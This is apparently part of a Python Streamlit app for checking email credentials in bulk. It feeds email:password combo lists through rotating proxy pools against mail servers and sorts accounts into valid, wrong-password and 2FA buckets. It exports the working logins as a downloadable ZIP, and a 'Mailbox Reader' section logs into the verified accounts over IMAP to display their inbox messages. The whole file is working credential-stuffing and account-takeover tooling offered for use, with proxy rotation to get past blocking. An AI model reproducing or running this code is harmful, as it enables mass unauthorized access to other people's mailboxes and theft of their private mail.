        return None, FAILED, str(e)[:40], None, trace_logs

    if CFG.get("FAST_MODE", True):
        failed_domain_cache[domain] = time.time()

    if best_verdict["status"] is not None:
        trace_logs.append(
            f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}]."
        )
        return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
    if flags["saw_407"] and not flags["saw_nonproxy"]:
        trace_logs.append(
            f"Every attempt died in the PROXY hop ({quarantine_size()} node(s) quarantined) "
            f"-> the mailbox was never reached, so the password is still untested."
        )
        return None, PROXY_UNHEALTHY, (
            f"every attempt failed in the proxy hop (407) - "
            f"{quarantine_size()} node(s) quarantined; fix/replace the proxy pool"
        ), None, trace_logs
    if retryable:
        return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
    if not dns_ok:
        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
    return None, FAILED, "all hosts unreachable (timeouts/refused) - password could not be tested", None, trace_logs

# ============================================================================
# EXECUTION TRIGGER
# ============================================================================

section_title("🚀", "Execute Live Checking Engine", "proxy-backed, post-auth verified, resumable")

RESULT_ACTION_MODES = [
    ("✅ Valid Found", "valid_results"),
    ("❌ Wrong Password Found", "wrong_results"),
    ("🔐 App Password / 2FA Found", "need_app_results"),
    ("🕓 RETRY_LATER Found", "retry_results"),
    ("🚫 RBL Blocked Found", "rbl_results"),
    ("🔌 Connection Failed Found", "conn_results"),
    ("🩹 Proxy Unhealthy Found", "proxy_results"),
]

ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in RESULT_ACTION_MODES]

col_action1, col_action2 = str_lit.columns([0.65, 0.35])
with col_action1:
    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
with col_action2:
    engine_action_mode = str_lit.selectbox(
        "Engine Action Mode:", options=ACTION_OPTIONS, index=0,
        help="Pick a pre-filter bucket (SMTP Failed sits right after DNS Failed) or a previous result bucket to re-run."
    )
    unfinished_runs = list_unfinished_runs()
    unfinished_pick = None
    if engine_action_mode == "Resume Unfinished":
        labels = [f"{r.get('saved_at','')} | {r.get('reason','stop')} | {r.get('checked',0)}/{r.get('total',0)}" for r in unfinished_runs] or ["none saved"]
        unfinished_pick = str_lit.selectbox("Unfinished run:", labels)

active_proxy_pool = get_filtered_active_proxies()

if start_engine_btn:
    clear_proxy_quarantine()
    log_probe_event("run start: 407 quarantine cleared")
    progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
    status_text = str_lit.empty()
    status_text.info("⏳ Opening the engine… resolving hosts, pre-testing the proxy pool, geo-tagging nodes.")

    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
    log_startup(
        f"RUN CONFIG -> workers={CFG.get('MAX_WORKERS_START')} deadline={CFG.get('ACCOUNT_DEADLINE')}s "
        f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
        f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
        f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
        f"smtp_precheck={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')} "
        f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
        f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
        f"direct_first={CFG.get('DIRECT_FIRST')}"
    )

    resume_lines = []
    if engine_action_mode == "Resume Unfinished" and unfinished_runs and unfinished_pick and unfinished_pick != "none saved":
        idx = [f"{r.get('saved_at','')} | {r.get('reason','stop')} | {r.get('checked',0)}/{r.get('total',0)}" for r in unfinished_runs].index(unfinished_pick)
        resume_lines = unfinished_runs[idx].get("remaining") or []

    _label_to_key = dict(RESULT_ACTION_MODES)

    def _raw_of(line):
        return line.split("|")[0].strip()

    category_queue_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": resume_lines,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    if engine_action_mode in _label_to_key:
        category_queue_map[engine_action_mode] = [
            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
        ]

    accounts_to_check = category_queue_map.get(engine_action_mode, [])

    if not accounts_to_check:
        str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'.")
    else:
        filtered_pool[:] = get_filtered_active_proxies()
        if not alive_pool:
            refresh_alive_pool()
        if alive_pool:
            active_proxy_pool = list(alive_pool)
        elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
            active_proxy_pool = []
        else:
            active_proxy_pool = list(filtered_pool)

        log_startup(
            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
        )
        if all_proxies and not alive_pool:
            str_lit.warning(
                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run DIRECT. "
                "If the direct egress cannot reach the ISP hosts either, you will get PROXY_UNHEALTHY / "
                "CONNECTION_FAILED — that is a pool problem, not a mailbox problem."
            )

        with session_state_lock:
            str_lit.session_state.valid_results = load_persistent_valid_results()
            str_lit.session_state.run_valid_count = 0
            str_lit.session_state.clean_valid_count = 0
            str_lit.session_state.wrong_results = []
            str_lit.session_state.need_app_results = []
            str_lit.session_state.conn_results = []
            str_lit.session_state.proxy_results = []
            str_lit.session_state.retry_results = []
            str_lit.session_state.rbl_results = []
            str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
            str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
            str_lit.session_state.skip_results = []
            str_lit.session_state.report_entries = []
            str_lit.session_state.log_lines = []
            str_lit.session_state.checked_emails_set = set()
            str_lit.session_state.last_checked_index = 0
            str_lit.session_state.engine_has_run = True
            str_lit.session_state.run_completion_status = "Unfinished"
            start_dt = datetime.now()
            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.end_timestamp = None
            str_lit.session_state.total_duration = None

        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
        with exec_tab1:
            log_container = str_lit.empty()
        with exec_tab2:
            report_metrics_placeholder = str_lit.empty()
            bucket_placeholders = {}
            BUCKET_SPEC = [
                ("valid_results", "✅ Valid Accounts Found"),
                ("wrong_results", "❌ Wrong Password Found"),
                ("conn_results", "🔌 Connection Failed Found"),
                ("proxy_results", "🩹 Proxy Unhealthy Found"),
                ("need_app_results", "🔐 App Password / 2FA Found"),
                ("retry_results", "🕓 RETRY_LATER Found"),
                ("rbl_results", "🚫 RBL Blocked Found"),
                ("smtp_results", "📮 SMTP Failed (pre-check)"),
                ("dns_results", "🛰 DNS Failed (pre-check)"),
            ]
            for _key, _title in BUCKET_SPEC:
                with str_lit.expander(f"{_title}", expanded=False):
                    bucket_placeholders[_key] = str_lit.empty()
            report_log_container = str_lit.empty()

        all_target_accounts = accounts_to_check[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check
        total_accs = len(all_target_accounts)
        checked_count = 0
        thread_local = threading.local()
        log_cap = 400 if CFG.get("DEBUG", False) else 120

        def render_buckets(snapshot):
            for key, title in BUCKET_SPEC:
                ph = bucket_placeholders.get(key)
                if ph is None:
                    continue
                items = snapshot.get(key) or []
                with ph.container():
                    if not items:
                        str_lit.caption("nothing here yet")
                        continue
                    str_lit.caption(f"{len(items)} account(s)")
                    col = TAG_COLORS.get({
                        "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
                        "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
                        "need_app_results": "NEED_APP_PASSWORD",
                        "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
                        "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
                    }.get(key, ""), "#cbd5e1")
                    for ln in items[-250:]:
                        str_lit.markdown(
                            f"<div style='font-family:ui-monospace,monospace;font-size:12px;"
                            f"color:{col}'>{html.escape(str(ln))}</div>",
                            unsafe_allow_html=True,
                        )

        def check_task(line):
            try:
                if ":" not in line:
                    return {"line": f"{line} | Error: Invalid format", "status": FAILED, "trace": ["Invalid format"]}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                reason = drop_before_check(email)
                if reason:
                    return {"line": f"{email}:{password} | {reason}", "email": email, "password": password,
                            "status": SKIP, "detail": reason, "trace": [reason]}
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                server, status, detail, px_used, trace = check_account_sync(
                    email, password, conf, domain, active_proxy_pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email, "password": password,
                        "status": status, "detail": detail, "trace": trace}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "password": "",
                        "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
            finally:
                if hasattr(thread_local, "state"):
                    try:
                        thread_local.state.clear()
                    except Exception:
                        pass

        detected_stop_reason = "Interrupted / Stopped before completion"
        run_interrupted = False
        try:
            current_workers = CFG["MAX_WORKERS_START"]
            if CFG.get("DYNAMIC_WORKER_SCALING", False):
                if total_accs > 500:
                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35, CFG["MAX_WORKERS_START"] * 2)
                elif total_accs < 20:
                    current_workers = max(2, min(5, total_accs))

            with ThreadPoolExecutor(max_workers=current_workers) as executor:
                future_to_line = {executor.submit(check_task, line): line for line in all_target_accounts}

                for index, future in enumerate(as_completed(future_to_line), 1):
                    checked_count += 1
                    try:
                        res = future.result(timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + 60)
                        if res:
                            st_val = res["status"]
                            em_val = res.get('email', '').strip().lower()

                            with session_state_lock:
                                if em_val:
                                    str_lit.session_state.checked_emails_set.add(em_val)
                                if st_val == VALID:
                                    if res["line"] not in str_lit.session_state.valid_results:
                                        str_lit.session_state.valid_results.append(res["line"])
                                        str_lit.session_state.run_valid_count += 1
                                    str_lit.session_state.clean_valid_count = str_lit.session_state.run_valid_count
                                elif st_val == WRONG:
                                    str_lit.session_state.wrong_results.append(res["line"])
                                elif st_val == APP:
                                    str_lit.session_state.need_app_results.append(res["line"])
                                elif st_val == RETRY:
                                    str_lit.session_state.retry_results.append(res["line"])
                                elif st_val == RBL:
                                    str_lit.session_state.rbl_results.append(res["line"])
                                elif st_val == SMTP_FAILED:
                                    str_lit.session_state.smtp_results.append(res["line"])
                                elif st_val == DNS_FAILED:
                                    str_lit.session_state.dns_results.append(res["line"])
                                elif st_val == PROXY_UNHEALTHY:
                                    str_lit.session_state.proxy_results.append(res["line"])
                                elif st_val == SKIP:
                                    str_lit.session_state.skip_results.append(res["line"])
                                else:
                                    str_lit.session_state.conn_results.append(res["line"])

                                str_lit.session_state.log_lines.append(
                                    f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}")
                                if len(str_lit.session_state.log_lines) > log_cap:
                                    str_lit.session_state.log_lines.pop(0)

                                trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
                                cred_combo = f"{res.get('email','')}:{res.get('password','')}" if res.get('password') else res.get('email', '')
                                str_lit.session_state.report_entries.append({
                                    "Time": datetime.now().strftime("%H:%M:%S"),
                                    "Email:Password": cred_combo,
                                    "Status": st_val.upper(),
                                    "Under-The-Hood Background Trace": f"Result: {res.get('detail','')}\nSteps Executed:\n  ↳ {trace_text}",
                                })

                                valid_len = len(str_lit.session_state.valid_results)
                                wrong_len = len(str_lit.session_state.wrong_results)
                                need_len = len(str_lit.session_state.need_app_results)
                                conn_len = len(str_lit.session_state.conn_results)
                                proxy_len = len(str_lit.session_state.proxy_results)
                                retry_len = len(str_lit.session_state.retry_results)
                                rbl_len = len(str_lit.session_state.rbl_results)
                                smtp_len = len(str_lit.session_state.smtp_results)
                                current_logs = list(str_lit.session_state.log_lines)
                                current_reports = list(str_lit.session_state.report_entries)
                                bucket_snapshot = {
                                    "valid_results": list(str_lit.session_state.valid_results),
                                    "wrong_results": list(str_lit.session_state.wrong_results),
                                    "conn_results": list(str_lit.session_state.conn_results),
                                    "proxy_results": list(str_lit.session_state.proxy_results),
                                    "need_app_results": list(str_lit.session_state.need_app_results),
                                    "retry_results": list(str_lit.session_state.retry_results),
                                    "rbl_results": list(str_lit.session_state.rbl_results),
                                    "smtp_results": list(str_lit.session_state.smtp_results),
                                    "dns_results": list(str_lit.session_state.dns_results),
                                }

                            time.sleep(0.01)

                            if st.session_state.get("colorize_logs", True):
                                log_container.markdown(colorize_logs(current_logs), unsafe_allow_html=True)
                            else:
                                log_container.code("\n".join(current_logs), language="text")

                            with report_metrics_placeholder.container():
                                r_col1, r_col2, r_col3, r_col4, r_col5, r_col6, r_col7, r_col8 = str_lit.columns(8)
                                r_col1.metric("✅ Valid", valid_len)
                                r_col2.metric("❌ Wrong", wrong_len)
                                r_col3.metric("🔑 AppPass/2FA", need_len)
                                r_col4.metric("🔌 Conn Failed", conn_len)
                                r_col5.metric("🩹 Proxy Dead", proxy_len)
                                r_col6.metric("🚫 RBL", rbl_len)
                                r_col7.metric("🕓 RETRY_LATER", retry_len)
                                r_col8.metric("📮 SMTP Failed", smtp_len)

                            render_buckets(bucket_snapshot)
                            report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=320)

                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        with session_state_lock:
                            str_lit.session_state.conn_results.append(err_msg)
                            str_lit.session_state.log_lines.append(err_msg)
                            current_logs = list(str_lit.session_state.log_lines)
                        if st.session_state.get("colorize_logs", True):
                            log_container.markdown(colorize_logs(current_logs), unsafe_allow_html=True)
                        else:
                            log_container.code("\n".join(current_logs), language="text")

                    if checked_count % 5 == 0 or checked_count == total_accs:
                        with session_state_lock:
                            done = set(str_lit.session_state.checked_emails_set)
                            valids = list(str_lit.session_state.valid_results)
                        left = []
                        for raw in all_target_accounts:
                            em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
                            if em not in done:
                                left.append(raw)
                        if left:
                            save_unfinished("In Progress (Running)", left, checked_count, total_accs)
                        try:
                            with file_write_lock:
                                with open("clean_valid_accounts.txt", "w", encoding="utf-8") as outfile:
                                    outfile.write(f"# Live sync | this run valid {len(valids)}\n")
                                    for v_item in valids:
                                        if ":" in v_item:
                                            em_part, rem_part = v_item.split(":", 1)
                                            outfile.write(f"{em_part.strip()}:{rem_part.split('|')[0].strip()}\n")
                        except Exception:
                            pass

                    if total_accs > 0:
                        pct = min(1.0, checked_count / total_accs)
                        progress_bar.progress(pct, text=f"Checking accounts [{engine_action_mode}]: {checked_count}/{total_accs} ({int(pct*100)}%)")
                    with session_state_lock:
                        v_len = len(str_lit.session_state.valid_results)
                        w_len = len(str_lit.session_state.wrong_results)
                        rt_len = len(str_lit.session_state.retry_results)
                        px_len = len(str_lit.session_state.proxy_results)
                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | Proxy Dead: {px_len} | RETRY_LATER: {rt_len}")

        except MemoryError as me:
            run_interrupted = True
            detected_stop_reason = "Resource Exhaustion: RAM full / Out of Memory"
            str_lit.error(f"⚠ Engine Stopped: RAM Full: {me}")
        except (OSError, IOError) as oe:
            run_interrupted = True
            detected_stop_reason = "Resource Exhaustion: Disk Space / ROM full" if getattr(oe, 'errno', 0) == 28 else f"Filesystem / I/O Error: {oe}"
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except (socket.timeout, ConnectionError, ssl.SSLError) as net_err:
            run_interrupted = True
            detected_stop_reason = f"Network Connection Failure: {net_err}"
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except BaseException as be:
            run_interrupted = True
            if isinstance(be, (SystemExit, KeyboardInterrupt)):
                detected_stop_reason = "System Shutdown / Interruption"
                raise be
            be_str = str(be).lower()
            if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket", "closed", "connection lost"]) or type(be).__name__ in ["RerunException", "StopException", "ScriptStopped"]:
                detected_stop_reason = "User Interruption: UI interaction"
            else:
                detected_stop_reason = f"Unexpected Error / Interruption: {be}"
        finally:
            with session_state_lock:
                done = set(str_lit.session_state.checked_emails_set)
            left = [raw for raw in all_target_accounts
                    if (raw.split(":", 1)[0].strip().lower() if ":" in raw else raw) not in done]
            if checked_count >= total_accs and not run_interrupted:
                clear_unfinished()
            elif left:
                save_unfinished(detected_stop_reason, left, checked_count, total_accs)

        end_dt = datetime.now()
        duration = end_dt - start_dt

        with session_state_lock:
            str_lit.session_state.run_completion_status = "Successful" if (checked_count >= total_accs and not run_interrupted) else "Unfinished"
            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
            valid_snapshot = list(str_lit.session_state.valid_results)
            wrong_snapshot = list(str_lit.session_state.wrong_results)
            need_snapshot = list(str_lit.session_state.need_app_results)
            conn_snapshot = list(str_lit.session_state.conn_results)
            proxy_snapshot = list(str_lit.session_state.proxy_results)
            retry_snapshot = list(str_lit.session_state.retry_results)
            rbl_snapshot = list(str_lit.session_state.rbl_results)
            smtp_snapshot = list(str_lit.session_state.smtp_results)
            dns_snapshot = list(str_lit.session_state.dns_results)

        progress_bar.progress(1.0, text="Checking complete!")
        status_text.success(f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}")

        try:
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
            rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
            try:
                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
            except OSError:
                pass

            hdr = f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n"
            with file_write_lock:
                for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                   (need_path, need_snapshot), (failed_path, conn_snapshot),
                                   (proxy_path, proxy_snapshot),
                                   (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot)):
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(hdr)
                        f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))

            clean_valid_path = "clean_valid_accounts.txt"
            temp_clean_count = 0
            with file_write_lock:
                with open(clean_valid_path, "w", encoding="utf-8") as outfile:
                    outfile.write(hdr)
                    for line in valid_snapshot:
                        if ":" in line:
                            email, remainder = line.split(":", 1)
                            outfile.write(f"{email.strip()}:{remainder.split('|')[0].strip()}\n")
                            temp_clean_count += 1

            zip_output_name = f"mail_results_{stamp}.zip"
            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
                for p, arc in ((clean_valid_path, "valid_email_password.txt"),
                               (wrong_path, os.path.basename(wrong_path)),
                               (need_path, os.path.basename(need_path)),
                               (failed_path, os.path.basename(failed_path)),
                               (proxy_path, os.path.basename(proxy_path)),
                               (retry_path, os.path.basename(retry_path)),
                               (rbl_path, os.path.basename(rbl_path)),
                               (smtp_path, os.path.basename(smtp_path)),
                               (dns_path, os.path.basename(dns_path))):
                    if os.path.exists(p):
                        z.write(p, arcname=arc)

            zip_bytes_data = b""
            if os.path.exists(zip_output_name):
                with open(zip_output_name, "rb") as fp:
                    zip_bytes_data = fp.read()

            with session_state_lock:
                str_lit.session_state.clean_valid_count = temp_clean_count
                str_lit.session_state.zip_name = zip_output_name
                str_lit.session_state.zip_bytes = zip_bytes_data
        except Exception as ex:
            str_lit.error(f"Error compiling results export files: {ex}")

# ============================================================================
# PERSISTENT RESULTS SUMMARY
# ============================================================================

if str_lit.session_state.engine_has_run or load_persistent_valid_results():
    section_title("📊", "Live Results Summary & ZIP Archive",
                  "persisted results, downloadable bundle, full under-the-hood traces")

    with session_state_lock:
        status_label = "🎉 Check Complete!" if str_lit.session_state.run_completion_status == "Successful" else "⚠️ Unfinished / Loaded from Disk"
        clean_count_val = str_lit.session_state.get("run_valid_count", str_lit.session_state.clean_valid_count)
        wrong_len_val = len(str_lit.session_state.wrong_results)
        need_len_val = len(str_lit.session_state.need_app_results)
        conn_len_val = len(str_lit.session_state.conn_results)
        proxy_len_val = len(str_lit.session_state.proxy_results)
        retry_len_val = len(str_lit.session_state.retry_results)
        rbl_len_val = len(str_lit.session_state.rbl_results)
        smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
        dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
        valid_res_copy = list(str_lit.session_state.valid_results)
        log_lines_copy = list(str_lit.session_state.log_lines)
        report_entries_copy = list(str_lit.session_state.report_entries)
        zip_bytes_copy = str_lit.session_state.zip_bytes
        zip_name_copy = str_lit.session_state.zip_name
        start_ts_copy = str_lit.session_state.start_timestamp
        end_ts_copy = str_lit.session_state.end_timestamp
        duration_copy = str_lit.session_state.total_duration
        summary_buckets = {
            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
            "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
            "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
            "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
        }

    str_lit.markdown(f"### {status_label}")

    if str_lit.session_state.run_completion_status == "Unfinished":
        unfinished_list = list_unfinished_runs()
        if unfinished_list:
            r0 = unfinished_list[0]
            str_lit.warning(
                f"⚠ **Engine Stopped Unfinished:** Reason: *{r0.get('reason','Unknown')}* | "
                f"Progress at stop: {r0.get('checked',0)}/{r0.get('total',0)} | Saved at: {r0.get('saved_at','')}")
        else:
            str_lit.warning("⚠ **Engine Stopped Unfinished.**")

    if start_ts_copy and end_ts_copy:
        str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | Ended **{end_ts_copy}** | Duration **{duration_copy}**")

    c1, c2, c3, c4, c5, c6, c7, c8, c9 = str_lit.columns(9)
    c1.metric("✅ Clean Valid", clean_count_val)
    c2.metric("❌ Wrong Password", wrong_len_val)
    c3.metric("🔑 App Password / 2FA", need_len_val)
    c4.metric("🔌 Connection Failed", conn_len_val)
    c5.metric("🩹 Proxy Unhealthy", proxy_len_val)
    c6.metric("🚫 RBL Blocked", rbl_len_val)
    c7.metric("🕓 RETRY_LATER", retry_len_val)
    c8.metric("🛰 DNS Failed", dns_len_val)
    c9.metric("📮 SMTP Failed", smtp_len_val)

    if proxy_len_val:
        str_lit.warning(
            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** — every attempt died with "
            f"407 Proxy Authentication Required. Those passwords are still UNTESTED."
        )

    for title, items in summary_buckets.items():
        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
            if not items:
                str_lit.caption("nothing here yet")
                continue
            for it in items:
                str_lit.code(it, language="text")

    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
    with exec_tab1_p:
        if log_lines_copy:
            render_logs(log_lines_copy)
        else:
            str_lit.info("No logs available from previous run.")
    with exec_tab2_p:
        if report_entries_copy:
            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]), use_container_width=True, height=320)
        else:
            str_lit.info("No report logs available.")

    if zip_bytes_copy and zip_name_copy:
        str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
                                file_name=zip_name_copy, mime="application/zip")

# ============================================================================
# MAILBOX READER
# ============================================================================

section_title("📬", "Mailbox Reader (Interactive Inbox Inspection)", "read verified inboxes without leaving the app")

with session_state_lock:
    current_valid_set = list(str_lit.session_state.valid_results) or load_persistent_valid_results()

if not current_valid_set:
    str_lit.info("Run the checker successfully or ensure valid account files exist to populate valid accounts.")
else:
    valid_combo_options = []
    for item in current_valid_set:
        try:
            if ":" in item:
                email_val, remainder = item.split(":", 1)
                valid_combo_options.append(f"{email_val.strip()}:{remainder.split('|')[0].strip()}")
        except Exception:
            continue

    if valid_combo_options:
        selected_combo = str_lit.selectbox("Select Valid Account to Read:", options=valid_combo_options)
        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", 1, 50, 10, 1)

        if str_lit.button("📖 Read Inbox Messages"):
            if selected_combo:
                acc_email, acc_pass = selected_combo.split(":", 1)
                acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
                imap_hosts = get_servers(acc_email).get("imap", [])
                mailbox_proxy = sample_alive_proxy(domain=acc_email.split("@")[-1]) if use_proxy else None

                if not imap_hosts:
                    str_lit.error("No IMAP host available for this provider domain name.")
                else:
                    with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and fetching inbox for {acc_email}..."):
                        success_read, fetched_msgs = False, []
                        for srv in imap_hosts:
                            msgs = read_mailbox_messages(acc_email, acc_pass, srv, proxy_str=mailbox_proxy, limit=max_msgs)
                            if msgs and not any("Error reading mailbox" in m for m in msgs):
                                fetched_msgs, success_read = msgs, True
                                break
                            elif msgs:
                                fetched_msgs = msgs
                        if success_read:
                            str_lit.success("Successfully retrieved recent messages from mailbox!")
                            for idx, m_content in enumerate(fetched_msgs, 1):
                                str_lit.markdown(f"**Message {idx}:**")
                                str_lit.code(m_content, language="text")
                        else:
                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
